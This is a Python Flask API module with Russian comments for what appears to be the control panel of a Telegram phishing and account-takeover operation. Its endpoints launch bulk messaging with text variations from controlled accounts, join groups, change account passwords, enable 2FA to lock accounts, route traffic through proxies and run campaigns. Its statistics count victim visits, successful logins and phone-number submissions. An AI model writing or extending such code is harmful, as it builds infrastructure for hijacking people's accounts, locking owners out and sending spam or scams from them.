from flask import Blueprint, jsonify, request
from flask_login import login_required
from web.middlewares.auth import admin_required
from web.extensions import db
from models.account import Account
from models.proxy import Proxy
from models.campaign import Campaign
from models.stat import Stat
from models.task import Task
from services.telegram.actions import send_bulk_messages, join_group, change_account_password, enable_2fa
from services.proxy.checker import check_proxy_task
from tasks.celery_app import celery_app
from celery.result import AsyncResult
import json
import datetime

api_bp = Blueprint('api', __name__)

# -------------------- Задачи (Celery) --------------------
@api_bp.route('/tasks/<task_id>/status', methods=['GET'])
@login_required
@admin_required
def task_status(task_id):
    """Получение статуса фоновой задачи Celery."""
    task = AsyncResult(task_id, app=celery_app)
    return jsonify({
        'task_id': task_id,
        'status': task.status,
        'result': task.result if task.ready() else None
    })

# -------------------- Действия с аккаунтами (асинхронные) --------------------
@api_bp.route('/accounts/<account_id>/send_message', methods=['POST'])
@login_required
@admin_required
def send_message(account_id):
    """Запуск рассылки сообщений от имени аккаунта."""
    data = request.get_json()
    contacts = data.get('contacts', [])
    base_text = data.get('text', '')
    variations = data.get('variations', [])
    from tasks.mass_actions import send_bulk_messages_task
    task = send_bulk_messages_task.delay(account_id, contacts, base_text, variations)
    return jsonify({'success': True, 'task_id': task.id})

@api_bp.route('/accounts/<account_id>/join_group', methods=['POST'])
@login_required
@admin_required
def join_group_route(account_id):
    """Запуск вступления в группу."""
    data = request.get_json()
    link = data.get('link')
    from tasks.mass_actions import join_group_task
    task = join_group_task.delay(account_id, link)
    return jsonify({'success': True, 'task_id': task.id})

@api_bp.route('/accounts/<account_id>/change_password', methods=['POST'])
@login_required
@admin_required
def change_password_route(account_id):
    """Смена пароля аккаунта (без 2FA)."""
    data = request.get_json()
    new_password = data.get('new_password')
    from tasks.mass_actions import change_password_task
    task = change_password_task.delay(account_id, new_password)
    return jsonify({'success': True, 'task_id': task.id})

@api_bp.route('/accounts/<account_id>/enable_2fa', methods=['POST'])
@login_required
@admin_required
def enable_2fa_route(account_id):
    """Включение двухфакторной аутентификации на аккаунте."""
    data = request.get_json()
    password = data.get('password')
    hint = data.get('hint', '')
    from tasks.mass_actions import enable_2fa_task
    task = enable_2fa_task.delay(account_id, password, hint)
    return jsonify({'success': True, 'task_id': task.id})

# -------------------- Прокси (асинхронная проверка) --------------------
@api_bp.route('/proxies/<int:proxy_id>/test', methods=['POST'])
@login_required
@admin_required
def test_proxy_async(proxy_id):
    """Запуск проверки прокси в фоне."""
    from tasks.proxy_checker import check_proxy_task
    task = check_proxy_task.delay(proxy_id)
    return jsonify({'success': True, 'task_id': task.id})

@api_bp.route('/proxies/bulk/test', methods=['POST'])
@login_required
@admin_required
def bulk_test_proxies():
    """Массовая проверка прокси."""
    ids = request.json.get('ids', [])
    from tasks.proxy_checker import bulk_check_proxies
    task = bulk_check_proxies.delay(ids)
    return jsonify({'success': True, 'task_id': task.id})

# -------------------- Кампании --------------------
@api_bp.route('/campaigns/<int:campaign_id>/start', methods=['POST'])
@login_required
@admin_required
def start_campaign_api(campaign_id):
    """Запуск кампании (асинхронно)."""
    from tasks.mass_actions import run_campaign
    task = run_campaign.delay(campaign_id)
    return jsonify({'success': True, 'task_id': task.id})

# -------------------- Статистика (JSON) --------------------
@api_bp.route('/stats/daily', methods=['GET'])
@login_required
@admin_required
def daily_stats():
    """Получение статистики по дням в формате JSON для графиков."""
    days = int(request.args.get('days', 7))
    today = datetime.date.today()
    stats = []
    for i in range(days):
        day = today - datetime.timedelta(days=i)
        # Исправлено: используем db.session.query вместо Stat.query
        stat = db.session.query(Stat).filter_by(date=day).first()
        stats.append({
            'date': day.isoformat(),
            'visits': stat.visits if stat else 0,
            'logins': stat.successful_logins if stat else 0,
            'phones': stat.phone_submissions if stat else 0
        })
    return jsonify(stats[::-1])  # от старых к новым